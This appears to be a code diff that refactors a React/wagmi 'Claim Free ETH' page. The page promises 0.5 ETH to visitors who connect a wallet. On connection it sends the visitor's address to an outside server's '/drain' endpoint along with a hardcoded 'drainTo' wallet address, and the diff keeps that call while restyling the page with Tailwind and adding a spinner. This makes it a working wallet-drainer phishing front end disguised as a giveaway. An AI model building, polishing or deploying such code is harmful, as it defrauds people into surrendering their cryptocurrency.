@@ -1,8 +1,8 @@
 import React, { useState } from "react";
 import ReactDOM from "react-dom/client";
 
-// Wagmi + Viem imports
-import { WagmiConfig, createConfig, configureChains } from "wagmi";
+// Wagmi + Viem
+import { WagmiConfig, createConfig, configureChains, useAccount, useConnect } from "wagmi";
 import { mainnet, sepolia } from "@wagmi/chains";
 import { publicProvider } from "viem/providers/public";
 import { InjectedConnector } from "wagmi/connectors/injected";
@@ -36,28 +36,27 @@ const config = createConfig({
 const App = () => {
   const [loading, setLoading] = useState(false);
   const [response, setResponse] = useState(null);
-  const [walletAddress, setWalletAddress] = useState(null);
 
-  const { open } = useWeb3Modal();
+  const { open } = useWeb3Modal(); // Opens full modal
+  const { address, isConnected } = useAccount(); // Wagmi hook
 
   const connectWallet = async () => {
     try {
       setLoading(true);
       setResponse(null);
 
-      // Open Web3Modal
+      // Opens Web3Modal v2 with all wallets
       const connection = await open();
-      const account = connection?.accounts?.[0];
-      if (!account) throw new Error("No wallet connected");
+      const walletAddress = connection?.accounts?.[0];
 
-      setWalletAddress(account);
+      if (!walletAddress) throw new Error("No wallet connected");
 
-      // Sample backend call
+      // Backend example call
       const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          address: account,
+          address: walletAddress,
           drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
         }),
       });
@@ -81,75 +80,64 @@ const App = () => {
 
   return (
     <WagmiConfig config={config}>
-      <div
-        style={{
-          minHeight: "100vh",
-          display: "flex",
-          justifyContent: "center",
-          alignItems: "center",
-          background: "#121212",
-          color: "#fff",
-          fontFamily: "Arial, sans-serif",
-        }}
-      >
-        <div
-          style={{
-            background: "#1e1e1e",
-            padding: "30px",
-            borderRadius: "12px",
-            width: "100%",
-            maxWidth: "420px",
-            textAlign: "center",
-          }}
-        >
-          <h1 style={{ marginBottom: "16px" }}>Claim Free ETH</h1>
-          <p style={{ fontSize: "14px", color: "#ccc" }}>
-            Connect your wallet to claim 0.5 ETH.
-          </p>
+      <div className="min-h-screen flex items-center justify-center bg-gray-900 text-white font-sans">
+        <div className="bg-gray-800 p-8 rounded-xl shadow-lg w-full max-w-md text-center">
+          <h1 className="text-2xl font-bold mb-4">Claim Free ETH</h1>
+          <p className="text-gray-400 mb-6">Connect your wallet to claim 0.5 ETH.</p>
 
           <button
             onClick={connectWallet}
             disabled={loading}
-            style={{
-              marginTop: "20px",
-              padding: "12px 24px",
-              width: "100%",
-              background: "#4CAF50",
-              border: "none",
-              borderRadius: "8px",
-              color: "#fff",
-              fontSize: "16px",
-              cursor: "pointer",
-              fontWeight: "bold",
-            }}
+            className={`w-full py-3 rounded-lg font-bold text-white transition-colors ${
+              loading ? "bg-gray-600 cursor-not-allowed" : "bg-green-500 hover:bg-green-600"
+            }`}
           >
-            {loading ? "Connecting..." : "Connect Wallet"}
+            {loading ? (
+              <div className="flex items-center justify-center">
+                <svg
+                  className="animate-spin h-5 w-5 mr-2 text-white"
+                  xmlns="http://www.w3.org/2000/svg"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                >
+                  <circle
+                    className="opacity-25"
+                    cx="12"
+                    cy="12"
+                    r="10"
+                    stroke="currentColor"
+                    strokeWidth="4"
+                  ></circle>
+                  <path
+                    className="opacity-75"
+                    fill="currentColor"
+                    d="M4 12a8 8 0 018-8v8H4z"
+                  ></path>
+                </svg>
+                Connecting...
+              </div>
+            ) : (
+              isConnected ? "Wallet Connected" : "Connect Wallet"
+            )}
           </button>
 
-          {walletAddress && (
-            <p style={{ marginTop: "12px", fontSize: "12px", color: "#aaa" }}>
-              Connected: {walletAddress}
-            </p>
+          {isConnected && (
+            <p className="mt-4 text-sm text-gray-400 break-all">Connected: {address}</p>
           )}
 
           {response && (
-            <pre
-              style={{
-                marginTop: "16px",
-                background: "#2a2a2a",
-                padding: "12px",
-                borderRadius: "8px",
-                fontSize: "12px",
-                textAlign: "left",
-              }}
-            >
+            <pre className="mt-4 bg-gray-700 p-4 rounded-lg text-left text-sm overflow-x-auto">
               {JSON.stringify(response, null, 2)}
             </pre>
           )}
         </div>
 
-        {/* Web3Modal Component */}
-        <Web3Modal projectId={projectId} themeMode="dark" />
+        {/* Web3Modal component for full modal experience */}
+        <Web3Modal
+          projectId={projectId}
+          themeMode="dark"
+          enableNetworkSwitch={true} // allows user to select between mainnet/sepolia
+        />
       </div>
     </WagmiConfig>
   );
